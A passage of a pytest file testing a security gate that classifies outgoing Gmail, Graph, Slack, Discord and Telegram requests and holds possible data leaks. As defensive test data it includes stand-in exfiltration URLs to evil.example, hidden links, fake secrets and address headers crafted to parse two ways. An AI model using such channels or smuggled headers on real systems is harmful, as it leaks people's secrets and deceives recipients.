"""The security review of the translators (docs/32, sections 8, 9 and the refinement of default
decision 12): writes that used to pass as reads and could carry data to an attacker's account,
what the person sees against what the recipient gets, secret scans that could be cut short,
deletions, and address headers that two parsers could read differently."""

import base64
import json
from dataclasses import replace
from email.message import EmailMessage
from email.policy import SMTP

import pytest

from backtide.gate.translate import Context, Effect, RequestView
from backtide.gate.translate.base import (
    MAX_READ_BODY,
    Note,
    all_trusted,
    has_secret,
    normalize_trusted,
)
from tests.gate_translate_kit import (
    BOT_PATH,
    DISCORD_AUTH,
    GITHUB_AUTH,
    GOOGLE_AUTH,
    GRAPH_AUTH,
    KEY,
    SLACK_AUTH,
    gmail_send,
    mail,
    multipart,
    read,
    request,
    scrubbed,
    tg,
)
from tests.scaling import assert_linear, best_time

SECRET = "sk-" + "a" * 40  # a key the strike patterns know
G = "/gmail/v1/users/me"
M = "/v1.0/me"
D = "/api/v10"


def _gmail(method: str, path: str, body: object = None) -> RequestView:
    return request(method, "gmail.googleapis.com", path, json_body=body, headers=(GOOGLE_AUTH,))


def _graph(method: str, path: str, body: object = None, auth: tuple[str, str] = GRAPH_AUTH):
    return request(method, "graph.microsoft.com", path, json_body=body, headers=(auth,))


def _slack(method: str, body: object) -> RequestView:
    return request("POST", "slack.com", f"/api/{method}", json_body=body, headers=(SLACK_AUTH,))


def _discord(method: str, path: str, body: object = None) -> RequestView:
    return request(method, "discord.com", path, json_body=body, headers=(DISCORD_AUTH,))


def _owner(view: RequestView) -> Context:
    """A context whose owner accounts include the account that ``view`` acts as."""
    account = read(view).account
    assert account is not None
    return Context(KEY, owner_accounts=frozenset({account}))


def _held_with_secret(view: RequestView, context: Context | None = None) -> None:
    reading = read(view) if context is None else read(view, context)
    assert reading.effect is not Effect.READ
    assert reading.secret_seen and reading.risk == 3, reading


# --- A1: "harmless writes" that could carry data out ----------------------------------------------


def test_the_slack_file_upload_is_a_send_that_shows_the_file() -> None:
    raw = read(request("POST", "files.slack.com", "/upload/v1/ABC123", body=b"datos"))
    assert raw.effect is Effect.SEND and raw.risk == 2
    assert [(a.name, a.size) for a in raw.attachments] == [("(no name)", 5)]
    assert raw.canonical is not None
    header, body = multipart([("file", "informe.pdf", "application/pdf", b"%PDF-1.7 x")])
    form = read(request("POST", "files.slack.com", "/upload/v1/ABC", body=body, headers=(header,)))
    assert form.effect is Effect.SEND
    assert [a.name for a in form.attachments] == ["informe.pdf"]
    leaked = read(request("POST", "files.slack.com", "/upload/v1/A", body=SECRET.encode()))
    assert leaked.effect is Effect.SEND and leaked.secret_seen and leaked.risk == 3
    # An upload has no recipient yet: it can never pass as "to a trusted channel".
    assert not all_trusted(raw, [normalize_trusted("slack", "C0123ABCD9")])
    # Asking for the upload URL still passes: the upload itself is held.
    url = read(_slack("files.getUploadURLExternal", {"filename": "a", "length": 3}))
    assert url.effect is Effect.READ


@pytest.mark.parametrize(
    "view",
    [
        _gmail("POST", f"{G}/drafts", {"message": {"raw": "eA"}}),
        _gmail("PUT", f"{G}/drafts/r-1", {"message": {"raw": "eA"}}),
    ],
    ids=["create", "update"],
)
def test_gmail_drafts_pass_only_in_the_owners_accounts(view: RequestView) -> None:
    held = read(view)
    assert held.effect is Effect.CHANGE and held.risk == 2 and Note.DRAFT in held.notes
    assert read(view, _owner(view)).effect is Effect.READ
    other = Context(KEY, owner_accounts=frozenset({"0123456789abcdef"}))
    assert read(view, other).effect is Effect.CHANGE


@pytest.mark.parametrize(
    "view",
    [
        _graph("POST", f"{M}/messages", {"subject": "x"}),
        _graph("PATCH", f"{M}/messages/AAMk1", {"isRead": True}),
        _graph("POST", f"{M}/messages/AAMk1/createReply"),
        _graph("POST", f"{M}/messages/AAMk1/createReplyAll"),
        _graph("POST", f"{M}/messages/AAMk1/createForward"),
        _graph("POST", f"{M}/messages/AAMk1/attachments", {"name": "a.txt"}),
    ],
    ids=["create", "update", "reply", "reply-all", "forward", "attachment"],
)
def test_graph_drafts_pass_only_in_the_owners_accounts(view: RequestView) -> None:
    assert read(view).effect is Effect.CHANGE
    assert read(view, _owner(view)).effect is Effect.READ
    headers = tuple(
        ("authorization", "Bearer eyOTHER") if name == "authorization" else (name, value)
        for name, value in view.headers
    )
    other_token = replace(view, headers=headers)
    assert read(other_token, _owner(view)).effect is Effect.CHANGE


def test_owner_accounts_must_be_plain_account_ids() -> None:
    with pytest.raises(ValueError):
        Context(KEY, owner_accounts=frozenset({"not hex"}))
    assert "owner" in repr(Context(KEY, owner_accounts=frozenset({"0123456789abcdef"})))


def test_telegram_set_my_commands_is_administration() -> None:
    reading = read(tg("setMyCommands", {"commands": [{"command": "a", "description": "b"}]}))
    assert reading.effect is Effect.ADMIN and reading.risk == 3


def test_answer_callback_query_passes_only_without_text_or_url() -> None:
    assert read(tg("answerCallbackQuery", {"callback_query_id": "1"})).effect is Effect.READ
    text = read(tg("answerCallbackQuery", {"callback_query_id": "1", "text": "hola ana"}))
    assert text.effect is Effect.CHANGE and text.first_lines == "hola ana"
    url = read(tg("answerCallbackQuery", {"callback_query_id": "1", "url": "https://x.example"}))
    assert url.effect is Effect.CHANGE
    by_get = read(
        request(
            "GET", "api.telegram.org", f"{BOT_PATH}/answerCallbackQuery?callback_query_id=1&text=x"
        )
    )
    assert by_get.effect is Effect.CHANGE
    leaked = read(tg("answerCallbackQuery", {"callback_query_id": "1", "text": SECRET}))
    assert leaked.secret_seen and leaked.risk == 3


@pytest.mark.parametrize(
    "view",
    [
        tg("getUpdates", {"offset": 1, "x": SECRET}),
        tg("sendChatAction", {"chat_id": 1, "action": {"nested": SECRET}}),
        _slack("conversations.history", {"channel": "C1", "cursor": [SECRET]}),
        _discord("POST", f"{D}/users/@me/channels", {"recipient_id": "7", "x": SECRET}),
        _discord("POST", f"{D}/channels/1/typing", {"x": SECRET}),
        _gmail("POST", f"{G}/messages/18c/modify", {"addLabelIds": [SECRET]}),
        request(
            "POST",
            "api.github.com",
            "/graphql",
            json_body={"query": "{ viewer { login } }", "variables": {"a": SECRET}},
            headers=(GITHUB_AUTH,),
        ),
    ],
    ids=["tg-get", "tg-typing", "slack-read", "dc-open-dm", "dc-typing", "gm-label", "graphql"],
)
def test_a_read_by_post_that_carries_a_secret_is_held_with_risk_3(view: RequestView) -> None:
    reading = read(view)
    assert reading.effect is Effect.UNKNOWN and reading.secret_seen and reading.risk == 3
    assert Note.SECRET_SEEN in reading.notes


def test_a_known_secret_in_a_read_by_post_is_held() -> None:
    context = scrubbed("very-private-value-77")
    reading = read(tg("getUpdates", {"offset": "very-private-value-77"}), context)
    assert reading.effect is Effect.UNKNOWN and reading.secret_seen


def test_a_read_by_post_over_64_kib_is_held() -> None:
    pad = "x" * MAX_READ_BODY
    for view in (
        tg("getUpdates", {"offset": 1, "pad": pad}),
        _slack("conversations.history", {"channel": "C1", "cursor": pad}),
        request(
            "POST",
            "api.github.com",
            "/graphql",
            json_body={"query": "{ viewer { login } }", "variables": {"a": pad}},
        ),
    ):
        reading = read(view)
        assert reading.effect is Effect.UNKNOWN and Note.TOO_LARGE in reading.notes, view.host
    small = read(tg("getUpdates", {"offset": 1, "pad": "x" * 1000}))
    assert small.effect is Effect.READ


# --- M4: what the person sees is what the recipient gets ------------------------------------------


def _alternative(plain: str, html: str) -> bytes:
    message = EmailMessage(policy=SMTP)
    message["From"] = "me@example.org"
    message["To"] = "ana@example.com"
    message["Subject"] = "Hola"
    message.set_content(plain)
    message.add_alternative(html, subtype="html")
    return message.as_bytes()


def test_an_html_alternative_that_says_the_same_passes_as_a_send() -> None:
    reading = read(
        gmail_send(
            _alternative(
                "Hola Ana,\nte paso la factura.",
                "<p>Hola Ana,</p><p>te paso la <b>factura</b>.</p>",
            )
        )
    )
    assert reading.effect is Effect.SEND
    assert reading.attachments == ()
    assert Note.ALTERNATIVE_DIFFERS not in reading.notes


@pytest.mark.parametrize(
    "html",
    [
        "<p>Transfiere 5000 euros a la cuenta ES00 0000</p>",
        '<p>Hola Ana,</p><p>te paso la factura.</p><img src="https://evil.example/p?d=datos">',
        '<p>Hola Ana,</p><p>te paso la <a href="https://evil.example/x">factura</a>.</p>',
    ],
    ids=["other-text", "tracking-image", "hidden-link"],
)
def test_an_html_alternative_that_differs_is_held_as_unknown(html: str) -> None:
    reading = read(gmail_send(_alternative("Hola Ana,\nte paso la factura.", html)))
    assert reading.effect is Effect.UNKNOWN
    assert Note.ALTERNATIVE_DIFFERS in reading.notes


def test_a_secret_deep_in_the_html_is_seen() -> None:
    html = "<p>" + "relleno " * 5000 + "</p><p>" + SECRET + "</p>"
    raw = mail(text="placeholder").replace(b"text/plain", b"text/html")
    raw = raw.replace(b"placeholder", html.encode())
    reading = read(gmail_send(raw))
    assert len(html) > 19_200
    assert reading.secret_seen and reading.risk == 3


def test_extra_text_and_inline_parts_count_as_attachments() -> None:
    message = EmailMessage(policy=SMTP)
    message["From"] = "me@example.org"
    message["To"] = "ana@example.com"
    message["Subject"] = "Hola"
    message.set_content("Hola Ana")
    message.add_attachment("segundo texto", subtype="plain", disposition="inline")
    message.add_attachment(b"\x89PNG fake", maintype="image", subtype="png", disposition="inline")
    reading = read(gmail_send(message.as_bytes()))
    assert reading.effect is Effect.SEND
    assert [(a.name, a.type) for a in reading.attachments] == [
        ("(inline text/plain)", "text/plain"),
        ("(inline image/png)", "image/png"),
    ]
    hidden = EmailMessage(policy=SMTP)
    hidden["From"] = "me@example.org"
    hidden["To"] = "ana@example.com"
    hidden.set_content("Hola Ana")
    hidden.add_attachment(SECRET, subtype="plain", disposition="inline")
    assert read(gmail_send(hidden.as_bytes())).secret_seen


def test_has_secret_reads_the_whole_text() -> None:
    from backtide.blackbox.redact import KnownScrubber

    text = "x " * (1024 * 1024) + SECRET
    assert has_secret(text, KnownScrubber(()))


def _big(secret_at_end: bool = True) -> bytes:
    return b"a" * (1024 * 1024 + 10) + (b" " + SECRET.encode() if secret_at_end else b"")


def test_a_secret_past_one_mib_of_an_attachment_is_seen_in_every_translator() -> None:
    data = _big()
    gm = read(gmail_send(mail(attachments=(("big.txt", "text/plain", data),))))
    assert gm.secret_seen
    graph = _graph(
        "POST",
        f"{M}/sendMail",
        {
            "message": {
                "toRecipients": [{"emailAddress": {"address": "ana@example.com"}}],
                "attachments": [
                    {
                        "@odata.type": "#microsoft.graph.fileAttachment",
                        "name": "big.txt",
                        "contentBytes": base64.b64encode(data).decode(),
                    }
                ],
            }
        },
    )
    assert read(graph).secret_seen
    header, body = multipart(
        [
            ("payload_json", None, "application/json", b'{"content":"x"}'),
            ("files[0]", "big.txt", "text/plain", data),
        ]
    )
    dc = request(
        "POST", "discord.com", f"{D}/channels/1/messages", body=body, headers=(header, DISCORD_AUTH)
    )
    assert read(dc).secret_seen
    header, body = multipart(
        [("chat_id", None, None, b"1"), ("document", "big.txt", "text/plain", data)]
    )
    telegram = request(
        "POST", "api.telegram.org", f"{BOT_PATH}/sendDocument", body=body, headers=(header,)
    )
    assert read(telegram).secret_seen
    clean = read(gmail_send(mail(attachments=(("big.txt", "text/plain", _big(False)),))))
    assert not clean.secret_seen


GROWTH = 8  # each body against one this many times smaller (tests/scaling.py)
SCANS = 6  # the most a read may cost, in whole-body secret scans of the largest body


def _near_the_caps(part: int) -> list[RequestView]:
    """A mail, a Discord upload and a Slack message with bodies near the caps, ``1/part`` of it."""
    data = b"a " * (1024 * 1024 // part)  # 2 MiB: 2.7 MiB in base64, within the MIME cap
    attached = mail(attachments=(("big.txt", "text/plain", data),))
    header, body = multipart(
        [
            ("payload_json", None, "application/json", b'{"content":"x"}'),
            ("files[0]", "big.txt", "text/plain", b"a " * ((2 * 1024 * 1024 - 1024) // part)),
        ]
    )
    dc = request(
        "POST", "discord.com", f"{D}/channels/1/messages", body=body, headers=(header, DISCORD_AUTH)
    )
    long_text = {"channel": "C1", "blocks": [{"text": {"text": "a " * (2 * 1024 * 1024 // part)}}]}
    return [gmail_send(attached), dc, _slack("chat.postMessage", long_text)]


def test_scanning_whole_bodies_near_the_caps_stays_fast() -> None:
    """Measured against this machine, not in seconds: the cost grows with the body (not faster)
    and stays within a few secret scans of a 4 MiB text, the largest body here."""
    from backtide.blackbox.redact import KnownScrubber

    text = "a " * (2 * 1024 * 1024 // GROWTH)
    scan = best_time(lambda: has_secret(text, KnownScrubber(())), 3) * GROWTH
    effects: list[Effect] = []
    for small, large in zip(_near_the_caps(GROWTH), _near_the_caps(1), strict=True):
        took = assert_linear(
            lambda view: effects.append(read(view).effect),
            small, large, GROWTH, floor=0.05, cap=60.0, label=large.host,
        )  # fmt: skip
        assert took < SCANS * scan, f"{large.host}: {took:.2f}s, {took / scan:.1f} scans of 4 MiB"
    assert len(effects) >= 6 and set(effects) == {Effect.SEND}


@pytest.mark.parametrize(
    "view",
    [
        _slack(
            "chat.postMessage",
            {
                "channel": "C1",
                "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": SECRET}}],
            },
        ),
        _slack(
            "chat.postMessage", {"channel": "C1", "text": "x", "attachments": [{"text": SECRET}]}
        ),
        request(
            "POST",
            "hooks.slack.com",
            "/services/T0001/B0002/sEcReTsEcReT",
            json_body={"blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": SECRET}}]},
        ),
        _discord("POST", f"{D}/channels/1/messages", {"embeds": [{"description": SECRET}]}),
        _discord(
            "POST",
            f"{D}/channels/1/messages",
            {
                "content": "x",
                "components": [{"type": 1, "components": [{"type": 2, "label": SECRET}]}],
            },
        ),
        _discord(
            "POST",
            f"{D}/channels/1/messages",
            {"poll": {"question": {"text": "q"}, "answers": [{"poll_media": {"text": SECRET}}]}},
        ),
        tg(
            "sendMessage",
            {
                "chat_id": 1,
                "text": "x",
                "reply_markup": {
                    "inline_keyboard": [[{"text": "a", "url": "https://x/?" + SECRET}]]
                },
            },
        ),
        tg("sendPoll", {"chat_id": 1, "question": "q", "options": [SECRET, "b"]}),
    ],
    ids=[
        "slack-blocks",
        "slack-attachments",
        "slack-webhook-blocks",
        "dc-embed",
        "dc-components",
        "dc-poll",
        "tg-reply-markup",
        "tg-poll-options",
    ],  # fmt: skip
)
def test_secrets_in_nested_values_are_seen(view: RequestView) -> None:
    _held_with_secret(view)


def test_a_secret_named_field_nested_in_a_message_is_seen() -> None:
    view = _slack(
        "chat.postMessage",
        {
            "channel": "C1",
            "text": "x",
            "metadata": {"event_payload": {"password": "hunter2hunter2"}},
        },
    )
    _held_with_secret(view)


def test_nested_message_text_is_shown() -> None:
    blocks = read(
        _slack(
            "chat.postMessage",
            {
                "channel": "C1",
                "text": "aviso",
                "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": "Lo que se ve"}}],
            },
        )
    )
    assert blocks.first_lines is not None and "Lo que se ve" in blocks.first_lines
    hook = read(
        request(
            "POST",
            "hooks.slack.com",
            "/services/T0001/B0002/sEcReTsEcReT",
            json_body={
                "blocks": [{"type": "section", "text": {"type": "plain_text", "text": "Hola"}}]
            },
        )
    )
    assert hook.first_lines == "Hola"
    embed = read(
        _discord(
            "POST",
            f"{D}/channels/1/messages",
            {"embeds": [{"title": "Factura", "description": "Pagar hoy"}]},
        )
    )
    assert embed.first_lines is not None
    assert "Factura" in embed.first_lines and "Pagar hoy" in embed.first_lines


def test_read_post_is_capped_scanned_whole_and_guards_its_urls() -> None:
    big = request("POST", "api.tavily.com", "/search", json_body={"query": "x" * MAX_READ_BODY})
    reading = read(big)
    assert reading.effect is Effect.UNKNOWN and Note.TOO_LARGE in reading.notes
    long_url = request(
        "POST",
        "api.firecrawl.dev",
        "/v1/scrape",
        json_body={"url": "https://evil.example/?d=" + "a" * 2100},
    )
    held = read(long_url)
    assert held.effect is Effect.UNKNOWN and Note.LONG_URL in held.notes
    secret_url = request(
        "POST",
        "api.firecrawl.dev",
        "/v1/scrape",
        json_body={"url": "https://evil.example/?key=" + "b" * 30},
    )
    seen = read(secret_url)
    assert seen.effect is Effect.UNKNOWN and seen.secret_seen and seen.risk == 3
    configured = Context(KEY, read_endpoints=frozenset({"search.example/q"}))
    text_url = request(
        "POST",
        "search.example",
        "/q",
        body=b"u=https://evil.example/" + b"c" * 2100,
        headers=(("content-type", "text/plain"),),
    )
    assert read(text_url, configured).effect is Effect.UNKNOWN
    fine = read(request("POST", "api.tavily.com", "/search", json_body={"query": "x" * 1000}))
    assert fine.effect is Effect.READ


# --- M5: Graph draft attachments ------------------------------------------------------------------


def test_removing_a_graph_attachment_is_a_deletion() -> None:
    view = _graph("DELETE", f"{M}/messages/AAMk1/attachments/AAMkA")
    reading = read(view)
    assert reading.effect is Effect.DELETE and reading.risk == 3
    assert read(view, _owner(view)).effect is Effect.DELETE


# --- B3: deletions, forum posts and forwards -----------------------------------------------------


def test_telegram_deletions_are_deletions_never_trusted() -> None:
    owner = [normalize_trusted("telegram", "42")]
    for method, params in (
        ("deleteMessage", {"chat_id": 42, "message_id": 1}),
        ("deleteMessages", {"chat_id": 42, "message_ids": [1, 2]}),
    ):
        reading = read(tg(method, params))
        assert reading.effect is Effect.DELETE and reading.risk == 3
        assert Note.DELETES_MESSAGE in reading.notes
        assert not all_trusted(reading, owner)


def test_discord_message_deletions_are_deletions() -> None:
    bot = read(_discord("DELETE", f"{D}/channels/111/messages/9"))
    assert bot.effect is Effect.DELETE and bot.risk == 3
    hook = read(request("DELETE", "discord.com", "/api/webhooks/222/tok/messages/9"))
    assert hook.effect is Effect.DELETE and hook.risk == 3
    assert not all_trusted(bot, [normalize_trusted("discord", "111")])


def test_a_discord_forum_post_is_a_send_with_its_message() -> None:
    reading = read(
        _discord(
            "POST",
            f"{D}/channels/111/threads",
            {"name": "Tema", "message": {"content": "Primer mensaje"}, "applied_tags": []},
        )
    )
    assert reading.effect is Effect.SEND and reading.recipients == ("111",)
    assert reading.first_lines is not None
    assert "Tema" in reading.first_lines and "Primer mensaje" in reading.first_lines
    assert reading.canonical is not None
    leaked = _discord(
        "POST", f"{D}/channels/111/threads", {"name": "t", "message": {"content": SECRET}}
    )
    _held_with_secret(leaked)
    from_message = read(_discord("POST", f"{D}/channels/111/messages/9/threads", {"name": "Hilo"}))
    assert from_message.effect is Effect.SEND and from_message.first_lines == "Hilo"
    odd = read(_discord("POST", f"{D}/channels/111/threads", {"name": "t", "nope": 1}))
    assert odd.effect is Effect.UNKNOWN


def test_a_discord_forward_is_a_forward() -> None:
    reference = {"type": 1, "message_id": "9", "channel_id": "222"}
    reading = read(_discord("POST", f"{D}/channels/111/messages", {"message_reference": reference}))
    assert reading.effect is Effect.FORWARD and reading.recipients == ("111",)
    reply = {"type": 0, "message_id": "9"}
    body = {"content": "ok", "message_reference": reply}
    assert read(_discord("POST", f"{D}/channels/111/messages", body)).effect is Effect.SEND
    odd = {"content": "ok", "message_reference": {"type": 7, "message_id": "9"}}
    assert read(_discord("POST", f"{D}/channels/111/messages", odd)).effect is Effect.UNKNOWN


# --- B5: address headers two parsers could read differently ---------------------------------------


@pytest.mark.parametrize(
    "to",
    [
        "ana@example.com (evil@malo.example)",
        "(comentario) ana@example.com",
        '"Ana" (x) <ana@example.com>',
        "ana(x)@example.com",
        '"a "b" c" <ana@example.com>',
        '"a \\" <evil@malo.example>" <ana@example.com>',
        "=?utf-8?q?evil=40malo.example?= <ana@example.com>",
        "=?utf-8?b?ZXZpbEBtYWxvLmV4YW1wbGU=?= <ana@example.com>",
        "=?utf-8?q?a=2C_b?= <ana@example.com>",
        "grupo: ana@example.com;",
        "ana@example.com <evil@malo.example>",
    ],
    ids=[
        "comment-after",
        "comment-before",
        "comment-in-name",
        "comment-in-address",
        "nested-quotes",
        "escaped-quote",
        "encoded-at-q",
        "encoded-at-b",
        "encoded-comma",
        "group",
        "bare-then-angle",
    ],  # fmt: skip
)
def test_address_headers_that_parse_differently_are_held(to: str) -> None:
    raw = mail(to="placeholder@example.com").replace(b"placeholder@example.com", to.encode())
    reading = read(gmail_send(raw))
    assert reading.effect is Effect.UNKNOWN and Note.BAD_ADDRESS in reading.notes, to


def test_plain_address_headers_still_read() -> None:
    for to, expected in (
        ("ana@example.com", ("ana@example.com",)),
        ("Ana <ana@example.com>, luis@example.com", ("ana@example.com", "luis@example.com")),
        ('"Ana, la jefa" <ana@example.com>', ("ana@example.com",)),
        ("=?utf-8?q?Jos=C3=A9?= <jose@example.com>", ("jose@example.com",)),
    ):
        raw = mail(to="placeholder@example.com").replace(b"placeholder@example.com", to.encode())
        assert read(gmail_send(raw)).recipients == expected, to


# --- B6: the parameters of an RPC body are capped -------------------------------------------------


def test_too_many_top_level_parameters_are_held() -> None:
    params: dict[str, object] = {f"p{n}": 1 for n in range(300)}
    params.update({"chat_id": 1, "text": "x"})
    reading = read(tg("sendMessage", params))
    assert reading.effect is Effect.UNKNOWN and Note.TOO_LARGE in reading.notes
    body = json.dumps({f"p{n}": 1 for n in range(300)} | {"channel": "C1", "text": "x"})
    slack = request(
        "POST", "slack.com", "/api/chat.postMessage", body=body.encode(),
        headers=(SLACK_AUTH, ("content-type", "application/json")),
    )  # fmt: skip
    assert read(slack).effect is Effect.UNKNOWN


# --- security review of T10-3 ---------------------------------------------------------------------

OWNER_CHAT = [normalize_trusted("telegram", "42")]
CHANNEL = "C0123ABCD9"
SLACK_OWNER = [normalize_trusted("slack", CHANNEL)]
INLINE_METHODS = [
    "editMessageText",
    "editMessageCaption",
    "editMessageMedia",
    "editMessageReplyMarkup",
    "editMessageLiveLocation",
    "stopMessageLiveLocation",
]


@pytest.mark.parametrize("method", INLINE_METHODS)
def test_an_inline_message_is_never_in_a_trusted_chat(method: str) -> None:
    """H2: ``inline_message_id`` wins over ``chat_id`` in Telegram: the edit may land in any
    chat where the bot's inline message was posted, so it is never trusted."""
    params = {
        "chat_id": 42,
        "inline_message_id": "AgAAAKjQ-x_",
        "text": "y",
        "caption": "y",
        "media": {"type": "photo", "media": "file-id-1"},
        "latitude": 1,
        "longitude": 2,
    }
    reading = read(tg(method, params))
    assert reading.effect is Effect.CHANGE
    assert Note.INLINE_MESSAGE in reading.notes
    assert reading.recipients == ("inline:AgAAAKjQ-x_",)
    assert not all_trusted(reading, OWNER_CHAT)
    plain = read(tg(method, {k: v for k, v in params.items() if k != "inline_message_id"}))
    assert all_trusted(plain, OWNER_CHAT)  # the same edit in the owner's chat still passes


def test_an_odd_inline_message_id_is_shown_as_a_digest() -> None:
    reading = read(tg("editMessageText", {"inline_message_id": "a=b/c" * 30, "text": "y"}))
    [recipient] = reading.recipients
    assert recipient.startswith("inline:") and len(recipient) < 64
    assert not all_trusted(reading, OWNER_CHAT)


@pytest.mark.parametrize(
    ("method", "params"),
    [
        ("sendPhoto", {"photo": "https://evil.example/x.png"}),
        ("sendDocument", {"document": "HTTP://evil.example/a.pdf"}),
        ("sendVideo", {"video": "https://evil.example/v"}),
        ("sendAnimation", {"animation": "https://evil.example/a"}),
        ("sendAudio", {"audio": "https://evil.example/a"}),
        ("sendVoice", {"voice": "https://evil.example/a"}),
        ("sendSticker", {"sticker": "https://evil.example/a.webp"}),
        ("sendPhoto", {"photo": "file-id", "thumbnail": "https://evil.example/t"}),
        ("sendMediaGroup", {"media": [{"type": "photo", "media": "https://evil.example/1"}]}),
        (
            "sendMediaGroup",
            {"media": json.dumps([{"type": "photo", "media": "https://evil.example/2"}])},
        ),
        (
            "editMessageMedia",
            {"message_id": 1, "media": {"type": "photo", "media": "https://evil.example/3"}},
        ),
        ("sendMessage", {"text": "mira https://evil.example/leak"}),
        ("sendMessage", {"text": "mira evil.example/leak"}),
        (
            "sendMessage",
            {"text": '<a href="https://evil.example/l">aquí</a>', "parse_mode": "HTML"},
        ),
        (
            "sendMessage",
            {
                "text": "aquí",
                "entities": [
                    {"type": "text_link", "offset": 0, "length": 4, "url": "https://evil.example/e"}
                ],
            },
        ),
        (
            "sendMessage",
            {"text": "hola", "link_preview_options": {"url": "https://evil.example/p"}},
        ),
        ("editMessageText", {"message_id": 1, "text": "ve a www.evil.example"}),
    ],
)
def test_a_send_that_makes_telegram_fetch_a_url_is_never_trusted(
    method: str, params: dict[str, object]
) -> None:
    """M3: Telegram's servers fetch a file given by URL and a link's preview: a channel out to
    any host, even through the owner's chat. Held, with the URL in what the person reads."""
    reading = read(tg(method, {"chat_id": 42, **params}))
    assert reading.effect in (Effect.SEND, Effect.CHANGE)
    assert Note.FETCHES_URL in reading.notes, reading
    assert reading.target is not None and "evil.example" in reading.target
    assert not all_trusted(reading, OWNER_CHAT)


@pytest.mark.parametrize(
    "params",
    [
        {"text": "hola, todo bien"},
        {"text": "mira https://evil.example/x", "link_preview_options": {"is_disabled": True}},
        {
            "text": "mira https://evil.example/x",
            "link_preview_options": json.dumps({"is_disabled": True}),
        },
        {"text": "mira evil.example", "disable_web_page_preview": True},
        {"text": "escribe a ana@example.com"},
        {"text": "versión 1.2.3, 3.14"},
    ],
)
def test_a_text_without_previews_or_links_stays_trusted(params: dict[str, object]) -> None:
    reading = read(tg("sendMessage", {"chat_id": 42, **params}))
    assert Note.FETCHES_URL not in reading.notes
    assert all_trusted(reading, OWNER_CHAT)


def test_a_photo_by_file_id_or_upload_stays_trusted() -> None:
    assert all_trusted(read(tg("sendPhoto", {"chat_id": 42, "photo": "AgACAgQAAxk"})), OWNER_CHAT)
    caption = read(tg("sendPhoto", {"chat_id": 42, "photo": "AgAC", "caption": "evil.example"}))
    assert all_trusted(caption, OWNER_CHAT)  # a caption gets no link preview


@pytest.mark.parametrize(
    "params",
    [
        {"text": "mira https://evil.example/x"},
        {"text": "mira https://evil.example/x", "unfurl_links": False},
        {"text": "mira https://evil.example/x", "unfurl_media": "false"},
        {"text": "hola", "icon_url": "https://evil.example/i.png"},
        {
            "text": "hola",
            "blocks": [{"type": "image", "image_url": "https://evil.example/b", "alt_text": "x"}],
        },
        {
            "text": "hola",
            "blocks": json.dumps(
                [{"type": "image", "alt_text": "x", "image_url": "https://evil.example/b"}]
            ),
        },
        {"text": "hola", "attachments": [{"text": "x", "thumb_url": "https://evil.example/t"}]},
    ],
)
def test_a_slack_message_that_makes_slack_fetch_a_url_is_never_trusted(
    params: dict[str, object],
) -> None:
    reading = read(_slack("chat.postMessage", {"channel": CHANNEL, **params}))
    assert reading.effect is Effect.SEND
    assert Note.FETCHES_URL in reading.notes
    assert reading.target is not None and "evil.example" in reading.target
    assert not all_trusted(reading, SLACK_OWNER)


def test_a_slack_message_with_unfurling_off_stays_trusted() -> None:
    off = {
        "channel": CHANNEL,
        "text": "mira https://evil.example/x",
        "unfurl_links": False,
        "unfurl_media": False,
    }
    assert all_trusted(read(_slack("chat.postMessage", off)), SLACK_OWNER)
    form = request("POST", "slack.com", "/api/chat.postMessage", headers=(SLACK_AUTH,),
                   form=f"channel={CHANNEL}&text=mira+evil.example&unfurl_links=false"
                   "&unfurl_media=false")  # fmt: skip
    assert all_trusted(read(form), SLACK_OWNER)
    plain = {"channel": CHANNEL, "text": "hola"}
    assert all_trusted(read(_slack("chat.postMessage", plain)), SLACK_OWNER)


def test_a_discord_message_that_makes_discord_fetch_a_url_is_never_trusted() -> None:
    trusted = [normalize_trusted("discord", "1234567890")]
    link = read(_discord("POST", f"{D}/channels/1234567890/messages",
                         {"content": "mira https://evil.example/x"}))  # fmt: skip
    assert Note.FETCHES_URL in link.notes and not all_trusted(link, trusted)
    suppressed = read(
        _discord(
            "POST",
            f"{D}/channels/1234567890/messages",
            {"content": "mira https://evil.example/x", "flags": 4},
        )
    )
    assert all_trusted(suppressed, trusted)
    embed = read(
        _discord(
            "POST",
            f"{D}/channels/1234567890/messages",
            {
                "content": "hola",
                "flags": 4,
                "embeds": [{"image": {"url": "https://evil.example/i"}}],
            },
        )
    )
    assert Note.FETCHES_URL in embed.notes and not all_trusted(embed, trusted)
    assert all_trusted(read(_discord("POST", f"{D}/channels/1234567890/messages",
                                     {"content": "hola"})), trusted)  # fmt: skip


def test_slack_channels_are_trusted_by_id_only() -> None:
    """M4: a name (``#general``) can be renamed, and Slack reads a name as another channel's:
    only ids (``C…``, ``G…``, ``D…``) are trusted, and a reading's channel is compared by id."""
    for name in ("#general", "general", "c0123abcd9", "C12", "@ana", "X0123ABCD9"):
        with pytest.raises(ValueError):
            normalize_trusted("slack", name)
    for good in ("C0123ABCD9", "G0123ABCD9", "D0123ABCD9", " C0123ABCD9 "):
        assert normalize_trusted("slack", good).recipient == good.strip()
    by_name = read(_slack("chat.postMessage", {"channel": "#general", "text": "x"}))
    from backtide.gate.translate.base import Trusted

    assert not all_trusted(by_name, [Trusted("slack", "#general")])


def test_only_slack_drops_its_own_token_and_only_its_token_field() -> None:
    """M6: the Authorization token repeated in the body is left out of the secret scan only for
    Slack's ``token`` field, when it is exactly the header's. Anywhere else it is a secret."""
    token = SLACK_AUTH[1].split(" ", 1)[1]
    twice = request("POST", "slack.com", "/api/conversations.info", headers=(SLACK_AUTH,),
                    form=f"channel=C1&token={token}&cursor={token}")  # fmt: skip
    assert read(twice).secret_seen
    as_json = request("POST", "slack.com", "/api/conversations.info", headers=(SLACK_AUTH,),
                      json_body={"channel": "C1", "token": token})  # fmt: skip
    assert read(as_json).effect is Effect.READ and not read(as_json).secret_seen
    search = request("POST", "api.tavily.com", "/search",
                     headers=(("authorization", f"Bearer {SECRET}"),),
                     json_body={"query": f"what is {SECRET}"})  # fmt: skip
    assert read(search).secret_seen and read(search).effect is Effect.UNKNOWN


def test_a_long_graph_draft_id_is_carried_as_a_digest_of_its_mailbox_and_id() -> None:
    """M7: Graph ids are long and end in "="; they were dropped (``draft = None``). Now a
    digest of the mailbox and the id, the same whatever the token (refreshed every hour)."""
    long_id = "AAMkAGI2TG93AAA=" + "x" * 140 + "AAA="
    patch = read(_graph("PATCH", f"{M}/messages/{long_id}", {"subject": "y"}))
    assert patch.draft is not None and len(patch.draft) <= 64
    other_token = read(
        _graph(
